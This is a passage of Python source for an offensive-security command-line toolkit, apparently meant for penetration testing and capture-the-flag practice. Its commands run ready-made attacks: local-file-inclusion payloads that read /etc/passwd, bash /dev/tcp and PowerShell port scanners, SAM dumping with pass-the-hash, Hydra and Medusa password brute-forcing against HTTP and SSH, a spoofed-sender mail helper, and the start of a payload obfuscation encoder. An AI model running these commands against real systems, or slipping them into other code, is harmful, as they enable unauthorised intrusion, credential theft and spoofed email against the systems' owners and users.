        awk 'NR>1 {split($2, a, ":"); ip=sprintf("%d.%d.%d.%d", strtonum("0x" substr(a[1], 7, 2)), strtonum("0x" substr(a[1], 5, 2)), strtonum("0x" substr(a[1], 3, 2)), strtonum("0x" substr(a[1], 1, 2))); printf "%s:%d\\n", ip, strtonum("0x" a[2])}' /proc/net/udp
        """

        print_msg(f"{GREEN} {tcp_cmd} {RESET}")
        command = "0..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect(<tgt_ip>,$_)) \"Port $_ open\"} 2>$null".replace("<tgt_ip>",rhost)
        print_msg(f"Windows usage: {command}")
        try:
            process = subprocess.Popen(
                ["xclip", "-sel", "clip"], stdin=subprocess.PIPE, text=True
            )
            process.communicate(input=tcp_cmd)
        except subprocess.CalledProcessError as e:
            print_error(f"Error: {e}{RESET}")

        return

    @cmd2.with_category(lateral_movement_category)
    def do_vpn(self, line):
        """
        Connect to a VPN by selecting from available .ovpn files.

        This function performs the following actions:
        1. Lists all `.ovpn` files in the current directory, sorted alphabetically.
        2. Handles cases with and without arguments:
        - Without arguments: Lists available `.ovpn` files and prompts the user to select one by number.
        - With a single argument: Treats the argument as a number and attempts to connect to the corresponding `.ovpn` file.
        3. Connects to the selected `.ovpn` file using `openvpn` and displays appropriate messages.
        4. Handles invalid input with error messages.

        Usage:
            vpn           # List available .ovpn files and select one to connect to
            vpn <number>  # Connect directly to the .ovpn file corresponding to the number

        :param line: The number of the .ovpn file to connect to, or an empty string to list available files.
        :type line: str
        :returns: None

        Manual execution:
        To manually use this function:
        1. Run the function with no arguments to list available `.ovpn` files.
        2. Choose a file by entering the corresponding number.
        3. Alternatively, run the function with a number argument to connect directly to the specified `.ovpn` file.

        Note: Ensure you have the necessary permissions and the `openvpn` command is available on your system.
        """

        ovpn_files = sorted([f for f in os.listdir("vpn") if f.endswith(".ovpn")])
        if not line.strip():
            if not ovpn_files:
                print_msg("No .ovpn files found.")
                return

            print_msg("Available .ovpn files:")
            for idx, file in enumerate(ovpn_files, start=1):
                print_msg(f"{idx}: {file}")

            choice = input("Select the number of the .ovpn file to connect to: ")
            try:
                choice = int(choice)
                if 1 <= choice <= len(ovpn_files):
                    file_to_connect = ovpn_files[choice - 1]
                else:
                    print_error("Invalid choice. Please select a number from the list.")
                    return
            except ValueError:
                print_error("Invalid input. Please enter a number.")
                return

        else:
            args = line.split()
            if len(args) == 1:
                try:
                    choice = int(args[0])
                    if 1 <= choice <= len(ovpn_files):
                        file_to_connect = ovpn_files[choice - 1]
                    else:
                        print_error("Invalid number. Please select a number from the list.")
                        return
                except ValueError:
                    print_error("Invalid input. Please enter a number.")
                    return
            else:
                print_error("Invalid command format. Use 'vpn' to list and select, or 'vpn <number>' to connect directly.")
                return

        print_msg(f"Connecting to vpn/{file_to_connect}")
        self.cmd(f"openvpn vpn/{file_to_connect}")

    @cmd2.with_category(lateral_movement_category)
    def do_id_rsa(self, line):
        """
        Create an SSH private key file and connect to a remote host using SSH.

        This function performs the following actions:
        1. Checks if the provided remote host (`rhost`) is valid.
        2. Verifies that a username is provided as an argument.
        3. Creates an SSH private key file in the `sessions` directory with a name based on the provided username.
        4. Opens the created file in the `nano` text editor for the user to paste the private key.
        5. Sets the file permissions to read-only for the owner (600).
        6. Optionally formats the key if the user chooses to.
        7. Connects to the remote host via SSH using the created private key.
        8. Displays a warning message when the SSH connection is closed.

        Usage:
            id_rsa <username>

        :param line: The username for SSH connection and private key file naming.
        :type line: str
        :returns: None

        Manual execution:
        To manually use this function:
        1. Run the function with the username argument, e.g., `id_rsa myuser`.
        2. Paste the private key into the `nano` editor when prompted.
        3. Save and exit the editor.
        4. The SSH connection will be established using the private key.

        Note: Ensure you have the necessary permissions to create files and connect via SSH.
        """

        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return
        if not line:
            print_error(f"must pass the user by argument like:{GREEN} id_rsa username")
            return
        file = f"sessions/id_rsa_{line}"
        print_msg(f"Try... nano {file}")
        self.cmd(f"nano {file} && chmod 600 {file}")
        format_key = input("Do you want to format the OpenSSH key? (y/n): ").lower()
        if format_key == 'y':
            with open(file, 'r') as key_file:
                raw_key = key_file.read()

            choice = input(f"    [?] do you wat format your rsa key ? 1) for openssh format or 2) for rsa_key format [1/2] (default: 1): ") or '1'
            if choice == '1':
                formatted_key = format_openssh_key(raw_key)

                with open(file, 'w') as key_file:
                    key_file.write(formatted_key)

                print_msg("Key formatted and saved.")
            elif choice == '2':
                formatted_key = format_rsa_key(raw_key)

                with open(file, 'w') as key_file:
                    key_file.write(formatted_key)

                print_msg("Key formatted and saved.")
            else:
                print_warn("Wrong choice!")
        print_msg(
            f"{YELLOW} Connecting to ssh {line}@{rhost} -i {file} {RED}[;,;] {RESET}"
        )
        self.onecmd("create_session_json")
        self.cmd(f"ssh {line}@{rhost} -i {file}")
        print_warn("ssh connection closed")
        return

    @cmd2.with_category(exploitation_category)
    def do_www(self, line):
        """
        Start a web server using Python 3 and display relevant network information.

        This function performs the following actions:
        1. Displays global network interfaces and their IP addresses.
        2. Copies the IP address of the `tun0` interface to the clipboard.
        3. Displays the current working directory and contents of the `sessions` directory.
        4. Starts a Python 3 HTTP server on port 80 in the `sessions` directory.
        5. Displays a message indicating that the web server is running and will show the shutdown message when stopped.

        Usage:
            www

        :param line: This parameter is used to pass the port as an argument by default is 80
        :type line: str
        :returns: None

        Manual execution:
        To manually use this function, run it to start the web server and follow the on-screen instructions to see the network information and server status.

        Note: Ensure you have `xclip` installed for clipboard operations and have the necessary permissions to run the HTTP server.
        """

        os.system(
            'ip a show scope global | awk \'/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }\''
        )
        os.system(
            "ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip"
        )
        os.system(
            'echo "[\e[96m`pwd`\e[0m]\e[34m" && cd sessions && ls && echo -en "\e[0m"'
        )
        if not line:
            port = 443
        else:
            port = line
        print_msg(f"{GREEN} Web server at sessions in port {RED} {port} {RESET}")
        os.system(f"cd sessions && sudo python3 www.py {port}")
        print_msg(f"{YELLOW} Shutdown Web server at sessions in port {RED} {port} {RESET}")
        return

    @cmd2.with_category(exploitation_category)
    def do_wrapper(self, line):
        """
        Copy payloads to clipboard for Local File Inclusion (LFI) attacks.

        This function provides three payload options for Local File Inclusion (LFI) attacks and copies the selected payload to the clipboard using `xclip`. The user is prompted to choose which payload to copy.

        Usage:
            wrapper

        :param line: This parameter is not used in the function.
        :type line: str
        :returns: None

        Manual execution:
        To manually use this function, run it and follow the prompts to select one of the three predefined payloads. The selected payload will be copied to the clipboard.

        Note: Ensure `xclip` is installed on your system for clipboard operations.
        """


        command1 = "echo ' php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd' | xclip -sel clip"
        command2 = "echo ' file:///proc/self/cmdline' | xclip -sel clip"
        command3 = "echo ' file:///etc/passwd' | xclip -sel clip"

        print_warn("<modo de uso>")
        print_msg(f"{command1=}")
        print_msg(f"{command2=}")
        print_msg(f"{command3=}")
        print_warn("</modo de uso>")
        choice = input(
            f"    {CYAN}[?] {MAGENTA}Which payload would you like to copy to the clipboard? (1, 2 or 3): {RESET}"
        ).strip()

        if choice == "1":
            self.cmd(command1)
            print_msg(f"Payload 1 copied to Clipboard")
        elif choice == "2":
            self.cmd(command2)
            print_msg(f"Payload 2 copied to Clipboard")
        elif choice == "3":
            self.cmd(command3)
            print_msg(f"Payload 3 copied to Clipboard")
        else:
            print_error("Invalid choice. Please select 1, 2 or 3.")
        return

    @cmd2.with_category(scanning_category)
    def do_swaks(self, line):
        """
        Sends an email using `swaks` (Swiss Army Knife for SMTP).

        This method constructs and executes a `swaks` command to send an email from an attacker’s address
        to a victim’s address, with a specified message body. The command is executed using the SMTP server
        address provided in the parameters.

        Parameters:
        - `line`: (str) Input line that is not used in this function.

        Functionality:
        1. Retrieves the SMTP server address (`rhost`) from the object's parameters.
        2. Checks if the server address is valid using `check_rhost()`.
        3. Prompts the user for the sender's email address (`from_attacker`).
        4. Prompts the user for the recipient's email address (`to_victim`).
        5. Prompts the user for the message body (`body`).
        6. Constructs the `swaks` command with the provided options.
        7. Executes the command using `self.cmd()`.
        8. Copies the command to the clipboard using `copy2clip()`.

        Example usage:
        >>> do_swaks("line")

        swaks --from attacker@hell.com --to victim@heaven.com,victim2@heaven.com,victim3@heaven.com   --body "testing" --server 127.0.0.1
        """

        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return
        from_attacker = input(
            f"    {CYAN}[?] {MAGENTA}FROM:  {RESET}"
        ).strip()
        to_victim = input(
            f"    {CYAN}[?] {MAGENTA}TO:  {RESET}"
        ).strip()
        body = input(
            f"    {CYAN}[?] {MAGENTA}BODY:  {RESET}"
        ).strip()
        command = f"swaks --from {from_attacker} --to {to_victim} --body {body} --server {rhost}"
        self.cmd(command)
        copy2clip(command)
        return

    @cmd2.with_category(scanning_category)
    def do_samrdump(self, line):
        """
        Run `impacket-samrdump` to dump SAM data from specified ports.

        This function executes `impacket-samrdump` to retrieve SAM data from the target host on ports 139 and 445. It first checks if the `rhost` parameter is valid, and if so, it runs the command for both ports.

        Usage:
            samrdump <target_host>

        :param line: The target host to dump SAM data from.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, specify the target host. The function will attempt to dump SAM data from the host on ports 139 and 445.
        impacket-samrdump -port 445 10.10.10.10
        Note: Ensure that `impacket-samrdump` is installed and properly configured on your system.
        """
        rhost = self.params["rhost"]
        domain = self.params["domain"]
        path = os.getcwd()
        users_txt = f"{path}/sessions/users.txt"
        hash_txt = f"{path}/sessions/hash.txt"

        if not check_rhost(rhost):
            return

        if line == "hash":
            if not os.path.exists(hash_txt):
                print_error(f"{hash_txt} not found.")
                return
            hash_value = get_hash()
            if not hash_value:
                return
            if ":" in hash_value:
                hashis = f"-hashes {hash_value}"
            else:
                hashis = f"-hashes :{hash_value}"

            user = input("    [!] Enter Username (default: Administrator): ") or 'Administrator'
            command = f"impacket-samrdump -port 139 -target-ip {rhost} {hashis} -dc-ip {rhost} {domain}"
            print_msg(command)
            self.cmd(command)
            command = f"impacket-samrdump -port 445 -target-ip {rhost} {hashis} -dc-ip {rhost} {domain}"
            print_msg(command)
            self.cmd(command)
            return
        else:
            print_msg(f"Try... impacket-samrdump -port 139  {rhost}")
            self.cmd(f"impacket-samrdump -port 139  {rhost}")
            print_msg(f"Try... impacket-samrdump -port 445  {rhost}")
            self.cmd(f"impacket-samrdump -port 445  {rhost}")

        return

    @cmd2.with_category(miscellaneous_category)
    def do_urlencode(self, line):
        """
        Encode a string for URL.

        This function takes a string as input, encodes it for URL compatibility using the `quote` function, and prints the encoded result.

        Usage:
            urlencode <string_to_encode>

        :param line: The string to encode for URL.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, provide a string to be URL-encoded as an argument. The function will encode it and print the result.

        Note: If no input is provided or the input is only whitespace, an error message will be displayed.
        """

        if not line.strip():
            print_error("Please provide a string to encode.")
            return

        encoded_string = quote(line.strip())
        print_msg(encoded_string)
        copy2clip(encoded_string)
        return

    @cmd2.with_category(miscellaneous_category)
    def do_urldecode(self, line):
        """
        Decode a URL-encoded string.

        This function takes a URL-encoded string as input, decodes it using the `unquote` function, and prints the decoded result.

        Usage:
            urldecode <url_encoded_string>

        :param line: The URL-encoded string to decode.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, provide a URL-encoded string as an argument. The function will decode it and print the result.

        Note: If no input is provided or the input is only whitespace, an error message will be displayed.
        """

        if not line.strip():
            print_error("Please provide a string to decode.")
            return

        decoded_string = unquote(line.strip())
        print_msg(decoded_string)
        copy2clip(decoded_string)
        return

    @cmd2.with_category(scanning_category)
    def do_lynis(self, line):
        """
        Performs a Lynis audit on the specified remote system.

        This function executes the `modules/lazylynis.sh` script with the target host defined in the `rhost` parameter. It is used to perform a security audit of the remote system using Lynis.

        Usage:
            lynis

        :param line: This parameter is not used in the current implementation.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, ensure that the `modules/lazylynis.sh` script is available and executable. Provide the target host in the format `lynis`.
        sudo lynis audit system remote 10.10.10.10 more info check modules/lazylynis.sh
        Note: The function assumes that `rhost` is a valid host address. If `rhost` is not valid, it will print an error message. For more details, check `modules/lazylynis.sh`.
        """

        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return

        print_msg(f"Try... sudo modules/lazylynis.sh {rhost}")
        self.cmd(f"sudo modules/lazylynis.sh {rhost}")

        return

    @cmd2.with_category(scanning_category)
    def do_snmpcheck(self, line):
        """
        Performs an SNMP check on the specified target host.

        This function executes the `snmp-check` command against the target host defined in the `rhost` parameter.

        Usage:
            snmpcheck

        :param line: This parameter is not used in the current implementation.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, ensure that `snmp-check` is installed and provide a target host in the format `snmpcheck`.
        snmp-check 10.10.10.10
        Note: The function assumes that `rhost` is a valid host address. If `rhost` is not valid, it will print an error message.
        """
        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return

        print_msg(f"Try... snmp-check {rhost}")
        self.cmd(f"snmp-check {rhost}")
        return

    @cmd2.with_category(scanning_category)
    def do_snmpwalk(self, line):
        """
        Performs an SNMP check on the specified target host.

        This function executes the `snmp-check` command against the target host defined in the `rhost` parameter.

        Usage:
            snmpwalk

        :param line: This parameter is not used in the current implementation.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, ensure that `snmpwalk -v 2c -c public` is installed and provide a target host in the format `snmpcheck`.
        snmpwalk -v 2c -c public 10.10.10.10
        Note: The function assumes that `rhost` is a valid host address. If `rhost` is not valid, it will print an error message.
        """
        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return

        print_msg(f"Try... snmpwalk -v 2c -c public {rhost}")
        self.cmd(f"snmpwalk -v 2c -c public {rhost}")
        return

    @cmd2.with_category(miscellaneous_category)
    def do_encode(self, line):
        """
        Encodes a string using the specified shift value and substitution key.

        This function encodes the given string by applying a shift value and a substitution key.

        Usage:
            encode <shift_value> <substitution_key> <string>

        :param line: The input string containing the shift value, substitution key, and the string to be encoded. The format should be '<shift_value> <substitution_key> <string>'.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, provide a shift value (integer), a substitution key, and the string to encode in the format `encode <shift_value> <substitution_key> <string>`.

        Note: The function assumes the shift value is an integer. If the shift value is not an integer, it will print an error message.
        """

        parts = line.split(" ", 2)
        if len(parts) != 3:
            print_error("Usage: encode <shift_value> <substitution_key> <string>")
            return

        try:
            shift_value = int(parts[0])
            substitution_key = parts[1]
            input_string = parts[2]
        except ValueError:
            print_error("Error: Shift value must be an integer")
            return

        # Encode the input string
        encoded_string = encode(input_string, shift_value, substitution_key)
        print_msg(f"Encoded string: {encoded_string}")
        decode(encoded_string, shift_value, substitution_key)
        copy2clip(encoded_string)
        return

    @cmd2.with_category(miscellaneous_category)
    def do_decode(self, line):
        """
        Decode a string using the specified shift value and substitution key.

        This function decodes the given string by applying a shift value and a substitution key to reverse the encoding process.

        Usage:
            decode <shift_value> <substitution_key> <string>

        :param line: The input string containing the shift value, substitution key, and the string to be decoded. The format should be '<shift_value> <substitution_key> <string>'.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, provide a shift value (integer), a substitution key, and the string to decode in the format `decode <shift_value> <substitution_key> <string>`.

        Note: The function assumes the shift value is an integer. If the shift value is not an integer, it will print an error message.
        """
        parts = line.split(" ", 2)
        if len(parts) != 3:
            print_error("Usage: decode <shift_value> <substitution_key> <string>")
            return

        try:
            shift_value = int(parts[0])
            substitution_key = parts[1]
            input_string = parts[2]
        except ValueError:
            print_error("Error: Shift value must be an integer")
            return

        # Decode the input string
        decoded_string = decode(input_string, shift_value, substitution_key)
        print_msg(f"Decoded string: {decoded_string}")
        copy2clip(decoded_string)
        return

    @cmd2.with_category(credential_access_category)
    def do_cred(self, line):
        """
        Display the credentials stored in the `credentials.txt` file and copy the password to the clipboard.

        This function reads the stored credentials from a file named `credentials.txt` located in the `sessions` directory.
        The file should be in the format `username:password`. If the file does not exist, an error message will be printed
        instructing the user to create the credentials file first. The function extracts the username and password from the file,
        prints them, and copies the password to the clipboard using `xclip`.

        :param line: A string parameter that is not used in this function. It is included for compatibility with command-line
                    interface functions.

        :returns: None

        Manual execution:
        To manually perform the equivalent actions, follow these steps:

            1. Ensure the file `sessions/credentials.txt` exists and contains credentials in the format `username:password`.
            2. Read the file and extract the username and password.
            3. Print the username and password to the console.
            4. Use the `xclip` tool to copy the password to the clipboard. Example command:

                echo '<password>' | xclip -sel clip

        Example:
        If `sessions/credentials.txt` contains `admin:password123`, the function will print:

            User : admin
            Pass : password123

        The password `password123` will be copied to the clipboard.

        Note:
        Ensure `xclip` is installed on your system for copying to the clipboard. The function assumes that `xclip` is available
        and correctly configured.
        """
        path = os.getcwd()
        file = f"{path}/sessions/credentials.txt"
        if not os.path.exists(file):
            print_error("You need use createcredentials user:pass before.")
            return

        with open(file, "rb") as f:
            data = f.read()
        creds = data.split(b":")
        user = creds[0].decode('utf-8')
        passwd = creds[1].decode('utf-8').replace('\n','')
        print_msg(f"User : {user}")
        print_msg(f"Pass : {passwd}")
        copy2clip(passwd)
        return

    @cmd2.with_category(scanning_category)
    def do_hostdiscover(self, line):
        """
        Discover active hosts in a subnet by performing a ping sweep.

        This method constructs and executes a bash script that performs a
        ping sweep on the specified subnet to identify active hosts. The
        subnet is determined from the 'rhost' parameter. For each host in
        the subnet, a ping request is sent, and active hosts are reported.

        Parameters:
        - line (str): The input line argument is not used in this function.

        Behavior:
        - Extracts the first three octets of the 'rhost' parameter to form
        the base IP pattern.
        - Constructs a bash script to ping each IP address in the subnet
        (from .1 to .254) and reports active hosts.
        - The generated bash script is displayed to the user.
        - Prompts the user to confirm whether they want to execute the
        generated command.
        - If the user confirms, executes the command using `self.cmd()`.
        - If the user declines, copies the command to the clipboard using
        `copy2clip()`.

        Side Effects:
        - Executes system commands and may affect the system environment.
        - May modify the clipboard content if the user chooses not to execute.

        Notes:
        - Ensure that the 'rhost' parameter is a valid IP address and that
        the `check_rhost()` function is implemented to validate the IP.
        - `print_msg()` is used to display the constructed command to the
        user.
        - `copy2clip()` is used to copy the command to the clipboard if
        not executed.

        Example:
        >>> do_hostdiscover("example_input")
        """
        rhost = self.params['rhost']
        if not check_rhost(rhost):
            return
        oct_rhost = rhost.split('.')
        pattern = oct_rhost[0] + "." + oct_rhost[1] + "." + oct_rhost[2]
        command = """        #!/bin/bash
        for i in $(seq 1 254); do
                timeout 1 bash -c "ping -c 1 {pattern}.$i" &>/dev/null && echo "[+] Host {pattern}.$i - active" &
        done; wait
        """.replace('        ','').replace('{pattern}',pattern)
        print_msg(command)
        execute = input("Do you want to execute? (yes/no): ").strip().lower()
        if execute == 'yes':
            self.cmd(command)
        else:
            copy2clip(command)
        return

    @cmd2.with_category(scanning_category)
    def do_portdiscover(self, line):
        """
        Scan all ports on a specified host to identify open ports.

        This method constructs and executes a bash script that performs a
        port scan on the specified host to determine which ports are open.
        It scans all ports from 0 to 65535 and reports any that are open.

        Parameters:
        - line (str): The input line argument is not used in this function.

        Behavior:
        - Extracts the 'rhost' parameter to determine the target IP address.
        - Constructs a bash script to scan all ports on the target IP address
        and report open ports.
        - The generated bash script is displayed to the user.
        - Prompts the user to confirm whether they want to execute the
        generated command.
        - If the user confirms, executes the command using `self.cmd()`.
        - If the user declines, copies the command to the clipboard using
        `copy2clip()`.

        Side Effects:
        - Executes system commands and may affect the system environment.
        - May modify the clipboard content if the user chooses not to execute.

        Notes:
        - Ensure that the 'rhost' parameter is a valid IP address and that
        the `check_rhost()` function is implemented to validate the IP.
        - `print_msg()` is used to display the constructed command to the
        user.
        - `copy2clip()` is used to copy the command to the clipboard if
        not executed.

        Example:
        >>> do_portdiscover("example_input")
        """
        rhost = self.params['rhost']
        if not check_rhost(rhost):
            return

        command = """        #!/bin/bash
        ip="{rhost}"
        echo "Escaneo de puertos abiertos en curso..."
        echo " "

        # Realiza un bucle a través de todos los puertos y verifica si están abiertos
        for port in $(seq 0 65535); do
            (echo >/dev/tcp/$ip/$port) >/dev/null 2>&1 && echo "Puerto $port abierto"
        done
        """.replace('        ','').replace('{rhost}',rhost)
        print_msg(command)
        execute = input("Do you want to execute? (yes/no): ").strip().lower()
        if execute == 'yes':
            self.cmd(command)
        else:
            copy2clip(command)
        return

    @cmd2.with_category(scanning_category)
    def do_portservicediscover(self, line):
        """
        Scan all ports on a specified host to identify open ports and associated services.

        This method constructs and executes a bash script that performs a
        port scan on the specified host to determine which ports are open
        and identifies any services running on those open ports. It scans
        all ports from 0 to 65535.

        Parameters:
        - line (str): The input line argument is not used in this function.

        Behavior:
        - Extracts the 'rhost' parameter to determine the target IP address.
        - Constructs a bash script to scan all ports on the target IP address
        and report open ports along with any associated services.
        - The generated bash script is displayed to the user.
        - Prompts the user to confirm whether they want to execute the
        generated command.
        - If the user confirms, executes the command using `self.cmd()`.
        - If the user declines, copies the command to the clipboard using
        `copy2clip()`.

        Side Effects:
        - Executes system commands and may affect the system environment.
        - Requires `sudo` privileges to use `lsof` for identifying services.
        - May modify the clipboard content if the user chooses not to execute.

        Notes:
        - Ensure that the 'rhost' parameter is a valid IP address and that
        the `check_rhost()` function is implemented to validate the IP.
        - `print_msg()` is used to display the constructed command to the
        user.
        - `copy2clip()` is used to copy the command to the clipboard if
        not executed.

        Example:
        >>> do_portservicediscover("example_input")
        """
        rhost = self.params['rhost']
        if not check_rhost(rhost):
            return

        command = """        #!/bin/bash
        ip="{rhost}"
        echo "Escaneo de puertos y servicios abiertos en curso..."
        echo " "

        # Realiza un bucle a través de todos los puertos y verifica si están abiertos
        for port in $(seq 0 65535); do
            (echo >/dev/tcp/$ip/$port) >/dev/null 2>&1 && {
                service=$(echo "$(sudo lsof -i :$port)" | awk 'NR==2{print $1}')
                [ -n "$service" ] && echo "Puerto $port abierto - Servicio: $service"
            }
        done
        """.replace('        ','').replace('{rhost}',rhost)
        print_msg(command)
        execute = input("Do you want to execute? (yes/no): ").strip().lower()
        if execute == 'yes':
            self.cmd(command)
        else:
            copy2clip(command)
        return

    @cmd2.with_category(miscellaneous_category)
    def do_rot(self, line):
        """
        Apply a ROT (rotation) substitution cipher to the given string.

        This function rotates each character in the input string by the specified number of positions in the alphabet. It supports rotation values between 1 and 27.

        Usage:
            rot <number> '<string>'

        :param line: The input string containing the number and the text to be rotated. The format should be '<number> '<string>' where <number> is the rotation amount and <string> is the text to be ciphered.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, provide a number (rotation amount) and a string in the format `rot <number> '<string>'`. Ensure the number is between 1 and 27.

        Note: The function assumes that the rotation number is an integer between 1 and 27. If the number is out of range or not a valid integer, it will print an error message.
        """

        parts = line.split("'", 1)
        if len(parts) != 2:
            print_error("Usage: rot <number> '<string>'")
            return

        number_str = parts[0].strip()
        text = parts[1].strip().strip("'")

        try:
            number = int(number_str)
            if not (1 <= number <= 27):
                raise ValueError("Number must be between 1 and 27.")
        except ValueError as e:
            print_error(f"Invalid number: {e}")
            return
        rotated_text = "".join(rotate_char(c, number) for c in text)

        copy2clip(rotated_text)
        return

    @cmd2.with_category(miscellaneous_category)
    def do_rotf(self, line):
        """
        Apply a ROT (rotation) substitution cipher to the given extension.

        This function rotates each character in the input extension by the specified number of positions in the alphabet. It supports rotation values between 1 and 27.

        Usage:
            rot <number> '<extension>'

        :param line: The input extension containing the number and the text to be rotated. The format should be '<number> '<extension>' where <number> is the rotation amount and <extension> is the text to be ciphered.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, provide a number (rotation amount) and a extension in the format `rot <number> '<extension>'`. Ensure the number is between 1 and 27.

        Note: The function assumes that the rotation number is an integer between 1 and 27. If the number is out of range or not a valid integer, it will print an error message.
        """


        parts = line.split(" ")
        print(len(parts))
        if len(parts) != 2:
            print_error("Usage: rot <number> extension example: rot 13 js")
            return

        number_str = parts[0].strip()
        ext = parts[1].strip()
        text = get_users_dic(ext)

        try:
            number = int(number_str)
            if not (1 <= number <= 27):
                raise ValueError("Number must be between 1 and 27.")
        except ValueError as e:
            print_error(f"Invalid number: {e}")
            return
        with open(text, 'r') as file:
            content = file.read().strip()
        file_name = text.replace(f".{ext}", f"_rotated_{number}.{ext}")

        rotated_text = "".join(rotate_char(c, number) for c in content)
        with open(file_name, 'w') as f:
            f.write(rotated_text)
        copy2clip(rotated_text)
        return

    @cmd2.with_category(credential_access_category)
    def do_hydra(self, line):
        """Uses Hydra to perform a brute force attack on a specified HTTP service with a user and password list.

        1. Checks if a wordlist is provided; if not, prints an error message.
        2. Validates the remote host parameter.
        3. Checks if the `line` argument is provided, which should include the path to crack and the port.
        4. If the `line` argument is valid, splits it into arguments for the path and port.
        5. Asks the user if they want to use a small dictionary from a JSON file.
        6. Constructs and prints the Hydra command with the provided parameters.
        7. Executes the Hydra command using `os.system`.

        :param line: The path to crack and port for the Hydra command, formatted as 'path port'.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, you would:
        - Provide the path to crack and the port as arguments to this function in the format 'path port'.
        - Ensure that the user list and wordlist are assign correctly.
        - hydra -f -L sessions/users.txt -P /usr/share/wordlists/rockyou.txt 10.10.11.9 -s 5000 http-get /v2/
        Note: Ensure that the remote host and wordlist parameters are valid, and that the path and port are specified correctly in the `line` argument.
        """

        rhost = self.params.get("rhost")
        wordlist = self.params.get("wordlist")

        if not wordlist:
            print_error(
                "You need to load the wordlist using p or payload or assign wordlist /path/to/wordlist"
            )
            return

        if not check_rhost(rhost):
            return

        if not line:
            print_error(
                "You need to pass the path to crack and the port, e.g., hydra /login/ 8080"
            )
            return

        args = line.split(" ")

        if len(args) < 2:
            print_error(
                "You need to pass the path to crack and the port, e.g., hydra /login/ 8080"
            )
            return

        use_small_dict = input("Do you want to use the small dictionary? (yes/no): ").strip().lower()

        if use_small_dict == "yes":
            path = os.getcwd()
            smalldic = f"{path}/modules/credentials.json"
            with open(smalldic, 'r') as f:
                data = json.load(f)

            # Create temporary files for users and passwords
            with open('sessions/small_users.txt', 'w') as f:
                for username in data["usernames"]:
                    if username:
                        f.write(username + '\n')

            with open('sessions/small_passwords.txt', 'w') as f:
                for password in data["passwords"]:
                    if password:
                        f.write(password + '\n')

            users = get_users_dic()
            command = f"hydra -f -L {users} -P sessions/small_passwords.txt {rhost} -s {args[1]} http-get {args[0]}"
        else:
            users = get_users_dic()
            command = f"hydra -f -L {users} -P {wordlist} {rhost} -s {args[1]} http-get {args[0]}"

        print_msg(f"Try... {command}")
        self.cmd(command)
        return

    @cmd2.with_category(credential_access_category)
    def do_medusa(self, line):
        """Uses medusa to perform a brute force attack on a specified ssh service with a user and password list.

        1. Checks if a wordlist is provided; if not, prints an error message.
        2. Validates the remote host parameter.
        3. Asks the user if they want to use a small dictionary from a JSON file.
        4. Constructs and prints the medusa command with the provided parameters.
        5. Executes the medusa command using `os.system`.

        :param line: The port if is't default port.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, you would:
        - Provide the path to crack and the port as arguments to this function in the format 'path port'.
        - Ensure that the user list and wordlist are assign correctly.
        - medusa -h 10.10.10.10 -U sessions/users.txt -P /usr/share/wordlists/rockyou.txt -e ns -M ssh"
        Note: Ensure that the remote host and wordlist parameters are valid, and that the path and port are specified correctly in the `line` argument.
        """

        rhost = self.params.get("rhost")
        wordlist = self.params.get("wordlist")
        option = ""

        if not wordlist:
            print_error(
                "You need to load the wordlist using p or payload or assign wordlist /path/to/wordlist"
            )
            return

        if not check_rhost(rhost):
            return
        if line:
            option = f"-n {line}"

        use_small_dict = input("Do you want to use the small dictionary? (yes/no): ").strip().lower()

        if use_small_dict == "yes":
            path = os.getcwd()
            smalldic = f"{path}/modules/credentials.json"
            with open(smalldic, 'r') as f:
                data = json.load(f)

            # Create temporary files for users and passwords
            with open('sessions/small_users.txt', 'w') as f:
                for username in data["usernames"]:
                    if username:
                        f.write(username + '\n')

            with open('sessions/small_passwords.txt', 'w') as f:
                for password in data["passwords"]:
                    if password:
                        f.write(password + '\n')

            users = get_users_dic()
            command = f"medusa -h {rhost} -U {users} -P sessions/small_passwords.txt {option} -e ns -M ssh"
        else:
            users = get_users_dic()
            command = f"medusa -h {rhost} -U {users} -P {wordlist} {option} -e ns -M ssh"

        print_msg(f"Try... {command}")
        self.cmd(command)
        return

    @cmd2.with_category(scanning_category)
    def do_nmapscript(self, line):
        """Perform an Nmap scan using a specified script and port.

        :param line: A string containing the Nmap script and port, separated by a space. Example: "http-enum 80".

        :returns: None

        Manual execution:
        To manually run an Nmap scan with a script and port, use the following command format:

            nmap --script <script> -p <port> <target> -oN <output-file>

        Example:
        If you want to use the script `http-enum` on port `80` for the target `10.10.10.10`, you would run:

            nmap --script http-enum -p 80 10.10.10.10 -oN sessions/webScan_10.10.10.10

        Ensure you have the target host (`rhost`) assign in the parameters and provide the script and port as arguments. The results will be saved in the file `sessions/webScan_<rhost>`.
        """

        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return
        parts = line.split(" ", 2)
        if len(parts) != 2:
            print_error("Usage: nmapscript <script> <port>")
            return
        script = parts[0]
        port = parts[1]
        print_msg(
            f"Try... nmap -sCV --script {script} -p{port} {rhost} -oN sessions/{script}_{rhost}"
        )
        self.cmd(f"nmap -sCV --script {script} -p{port} {rhost} -oN sessions/{script}_{rhost}")
        return

    @cmd2.with_category(miscellaneous_category)
    def do_encoderpayload(self, line):
        """
        Applies various obfuscations to a given command line string to create multiple obfuscated versions.

        1. Defines a helper function `double_base64_encode(cmd)` that performs double Base64 encoding on a given command.
        2. Defines the `apply_obfuscations(cmd)` function to create a list of obfuscated commands using different techniques.
